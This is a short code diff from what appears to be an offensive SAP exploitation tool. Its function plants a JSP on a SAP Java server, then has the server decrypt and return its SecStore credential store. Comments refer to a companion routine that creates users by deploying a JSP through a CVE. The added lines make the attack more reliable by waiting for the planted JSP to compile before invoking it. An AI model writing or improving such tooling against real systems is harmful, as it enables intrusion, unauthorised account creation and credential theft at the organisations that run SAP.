@@ -208,6 +208,17 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
 
     print(f"[+] {node.sid}: SecStore JSP at {jsp_url}")
 
+    # Warm-up probe: same Jasper-compile race that bit
+    # _ensure_java_db_jsp / deploy_create_user_jsp_via_cve_31324.
+    # Without this, the very first invoke_secstore_jsp() right after
+    # the chunked write returns "HTTP 404" instead of waiting the
+    # second or two for Tomcat to pick up the new file.
+    from sap_java_runner import _wait_for_jsp_ready
+    if not _wait_for_jsp_ready(jsp_url, sid=node.sid, label="SecStore JSP"):
+        result["error"] = (f"SecStore JSP at {jsp_url} never reached "
+                           f"HTTP 200 after compile-window retries")
+        return result
+
     # 2. Invoke — server decrypts with its own SecStoreFS implementation.
     r = _ss.invoke_secstore_jsp(jsp_url, node.sid)
     if not r["success"]:
